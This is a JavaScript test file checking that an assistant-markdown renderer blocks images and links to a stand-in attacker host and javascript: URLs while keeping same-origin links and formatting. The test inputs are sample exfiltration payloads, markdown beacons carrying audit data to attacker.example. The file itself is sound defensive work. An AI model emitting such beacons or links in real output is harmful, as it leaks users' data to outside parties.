import assert from "node:assert/strict";
import { after, test } from "node:test";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { createServer } from "vite";

const server = await createServer({
  configFile: false,
  server: { middlewareMode: true },
  appType: "custom",
  esbuild: { jsx: "automatic" },
});
after(() => server.close());

const { AssistantMarkdown } = await server.ssrLoadModule("/app/components/assistant-markdown.tsx");
const render = (children) =>
  renderToStaticMarkup(
    createElement(AssistantMarkdown, { origin: "https://console.example", children }),
  );

test("assistant images cannot load or preload an audit-data beacon", () => {
  const html = render("![Audit evidence](https://attacker.example/px?d=audit-data)");
  assert.doesNotMatch(html, /<img\b|rel="preload"|attacker\.example/);
  assert.match(html, /Audit evidence/);
});

test("assistant links cannot send audit data to another origin", () => {
  for (const url of [
    "https://attacker.example/px?d=audit-data",
    "//attacker.example/px?d=audit-data",
    "javascript:alert(1)",
  ]) {
    const html = render(`[Audit evidence](${url})`);
    assert.doesNotMatch(html, /href="[^"]*(?:attacker\.example|javascript:)/);
    assert.match(html, /Audit evidence/);
  }
});

test("audit formatting and same-origin navigation remain available", () => {
  const html = render(
    "**Actor** `claude.tool.called`\n\n| Actor | Count |\n| --- | --- |\n| Alice | 2 |\n\n" +
      "[thread](/t/123) [settings](../settings) [events](#events) " +
      "[console](https://console.example/t/123)",
  );
  for (const expected of [
    "<strong>Actor</strong>",
    "<code>claude.tool.called</code>",
    "<table>",
    'href="/t/123"',
    'href="../settings"',
    'href="#events"',
    'href="https://console.example/t/123"',
  ]) {
    assert.ok(html.includes(expected), expected);
  }
});
